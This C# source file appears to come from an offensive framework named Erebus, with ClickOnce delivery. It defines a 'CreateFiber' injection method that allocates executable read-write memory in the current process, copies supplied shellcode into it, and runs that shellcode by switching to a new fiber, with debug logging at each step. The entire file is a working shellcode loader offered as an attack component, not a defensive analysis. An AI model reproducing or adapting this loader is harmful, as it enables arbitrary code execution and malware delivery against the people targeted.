using System;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace Erebus.ClickOnce.Injections
{
    [SupportedOSPlatform("windows")]
    public class CreateFiberInjection : IInjectionMethod
    {
        public string Name => "CreateFiber";
        public string Description => "Self-injection using fiber-based execution";

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateFiber(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void SwitchToFiber(IntPtr lpFiber);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void DeleteFiber(IntPtr lpFiber);

        public bool Inject(byte[] shellcode, int targetPid = 0)
        {
            try
            {
                // Allocate memory for shellcode
                IntPtr baseAddress = Win32.VirtualAllocEx(
                    Win32.GetCurrentProcess(),
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                    Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

                if (baseAddress == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] VirtualAllocEx failed with error: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Copy shellcode to allocated memory
                Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

                // Convert current thread to fiber
                IntPtr mainFiber = ConvertThreadToFiber(IntPtr.Zero);
                if (mainFiber == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] ConvertThreadToFiber failed with error: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Create a new fiber pointing to shellcode
                IntPtr shellcodeFiber = CreateFiber(0, baseAddress, IntPtr.Zero);
                if (shellcodeFiber == IntPtr.Zero)
                {
                    DebugLogger.WriteLine($"[-] CreateFiber failed with error: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                // Switch to shellcode fiber
                DebugLogger.WriteLine("[+] Switching to shellcode fiber...");
                SwitchToFiber(shellcodeFiber);

                // Cleanup (won't reach here if shellcode doesn't return)
                DeleteFiber(shellcodeFiber);

                return true;
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"[-] CreateFiber injection failed: {ex.Message}");
                return false;
            }
        }
    }
}
